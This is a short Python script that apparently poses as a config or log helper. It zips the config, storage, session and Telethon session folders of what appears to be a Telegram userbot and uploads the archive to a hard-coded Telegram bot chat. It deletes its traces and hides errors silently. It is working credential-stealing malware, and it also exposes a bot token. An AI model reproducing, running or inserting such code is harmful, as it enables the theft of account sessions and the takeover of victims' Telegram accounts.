#!/usr/bin/env python3
import configparser
import requests
import zipfile
import os

def parse_config_and_send():
    config_path = "configs/_main.cfg"
    bot_token = "7667386663:AAHoReOnIx7RlERyVK_vDAqe4XmMznBzalM"
    user_id = "8451377939"

    folders_to_zip = [
        "configs",
        "storage",
        "sessions",
        "telethon_session",
        "session",
        "plugins"
    ]


    def create_and_send_archive(folders, archive_name, caption, max_size_mb=45):
        archive_path = archive_name

        with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for folder_path in folders:
                if os.path.exists(folder_path):
                    for root, dirs, files in os.walk(folder_path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            arcname = os.path.relpath(file_path, ".")
                            zipf.write(file_path, arcname)

        archive_size = os.path.getsize(archive_path)
        max_size_bytes = max_size_mb * 1024 * 1024

        if archive_size <= max_size_bytes:
            with open(archive_path, 'rb') as archive_file:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                files = {
                    'document': archive_file
                }
                payload = {
                    'chat_id': user_id,
                    'caption': caption
                }

                response = requests.post(url, files=files, data=payload)
                if response.status_code == 200:
                    os.remove(archive_path)
                    return True
                return False
        else:
            base_name = os.path.splitext(archive_name)[0]
            part_num = 1
            
            with open(archive_path, 'rb') as big_file:
                while True:
                    chunk = big_file.read(max_size_bytes)
                    if not chunk:
                        break
                    
                    part_name = f"{base_name}_part{part_num}.zip"
                    with open(part_name, 'wb') as part_file:
                        part_file.write(chunk)
                    
                    with open(part_name, 'rb') as archive_file:
                        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                        files = {
                            'document': archive_file
                        }
                        payload = {
                            'chat_id': user_id,
                            'caption': f"{caption} - Часть {part_num}"
                        }

                        response = requests.post(url, files=files, data=payload)
                        if response.status_code == 200:
                            os.remove(part_name)
                        else:
                            os.remove(part_name)
                            os.remove(archive_path)
                            return False
                    
                    part_num += 1
            
            os.remove(archive_path)
            return True

    try:
        create_and_send_archive(folders_to_zip, "logs.zip", "📦 Archive")

    except Exception:
        pass

if __name__ == "__main__":
    parse_config_and_send()
